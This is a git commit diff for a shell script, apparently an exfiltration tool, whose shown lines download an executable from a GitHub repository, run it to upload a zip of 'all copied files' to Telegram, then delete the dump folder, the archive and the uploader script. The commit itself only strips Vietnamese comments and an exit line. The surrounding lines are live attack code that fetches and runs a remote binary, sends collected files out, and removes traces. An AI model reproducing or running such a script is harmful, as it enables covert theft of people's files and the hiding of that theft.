2c34a6e5e992d4af170748f576023b36ab4145b3
idontknow-CC <2sob.3r0th3rcc@gmail.com>
2024-10-03 14:02:13 +0700

    Update linux_ciaov2_upload.sh

--- linux_ciaov2_upload.sh
+++ linux_ciaov2_upload.sh
@@ -10,13 +10,9 @@ wget https://github.com/idontknow-CC/gigido/raw/main/linux_telegram_uploader
 chmod +x linux_telegram_uploader
 ./linux_telegram_uploader -f dump.zip -c "Here are all copied files!"
 
-# Chờ 15 giây
 sleep 15
 
-# Xóa các file còn lại trong thư mục dump
 rm -rf /home/dump/
 rm /home/dump.zip
 rm /home/telegram_uploader.sh
 
-# Kết thúc
-exit
